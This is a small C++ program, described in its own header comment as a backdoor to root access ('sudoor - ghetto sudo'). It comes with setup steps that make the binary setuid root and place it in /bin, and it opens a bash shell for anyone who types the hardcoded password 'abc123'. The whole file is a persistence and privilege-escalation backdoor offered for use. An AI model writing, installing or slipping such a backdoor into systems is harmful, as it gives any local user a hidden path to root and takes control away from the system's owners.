/*
sudoor - ghetto sudo
====================
This C++ script can probably only serve as a backdoor means to root access. I use it on some of my servers to ensure that if my server is taken over, I will always have root access via one of my non-privileged accounts.


pre-check: (make sure you're root)
# id

setup:
# g++ sudoor.c -o sudoor
# chmod u+s sudoor
# mv sudoor /bin/sudoor

usage: (by non-privileged users)
# sudoor
Password: abc123
Login successfull Opening bash as root.

# <-- run commands.
*/

#include <stdlib.h>
#include <iostream>

using namespace std;

int main(){
	string pass;

	cout << "Password: ";
	cin >> pass;

	if(pass == "abc123"){
		cout << "Login successfull ";
		cout << "Opening bash as root." << endl << endl;
		system("/bin/bash");
	}else{
		cout << "Login failed" << endl;
	}
	return 0;
}
